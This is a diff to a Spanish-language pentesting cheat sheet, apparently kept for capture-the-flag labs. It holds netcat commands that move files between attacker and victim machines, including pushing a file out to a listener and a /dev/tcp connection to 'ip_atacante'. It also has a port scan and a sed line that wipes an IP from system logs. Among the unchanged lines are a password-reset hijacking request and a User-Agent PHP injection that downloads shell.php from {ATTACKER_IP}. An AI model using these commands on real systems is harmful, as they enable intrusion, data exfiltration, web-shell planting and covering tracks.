@@ -1,9 +1,21 @@
-# netcat
-A> nc -lnvp 444 < chisel
-V> cat > chisel < nc /dev/tcp/ip_atacante/444
+# netcat file transfer
+a> nc -lnvp 444 < chisel
+v> cat > chisel < nc /dev/tcp/ip_atacante/444
+--
+v> nc -l 4444 > file
+a> nc 10.10.1.23 4444 < file
+--
+v> cat file | nc 10.6.4.61 9001
+a> nc -lnvp 9001 > file
+
+# nc port-scanner
+nc -zv 172.17.0.1 1-1000
 
 # abre un puerto y queda a la espera de conexiones
 rlwrap nc -lnvp PUERTO 
+
+# ftp
+ftp -p 10.10.69.8 21 # modo pasivo
 
 # cp
 cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $! 
@@ -42,6 +54,7 @@ head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' # generador de pass
 sed -i '/192\.168\.0\.1/d' /var/log/messages.log # elimina todas las lineas que contienen la ip
 sed 's/ //g' hash.txt # elimina todas las lineas en blanco
 sed '/^[[:space:]]*$/d' # elimina los espacios 
+sed 's/\\n/\n/g' # reemplazar \n a salto de linea
 --------------------
 curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
 curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%
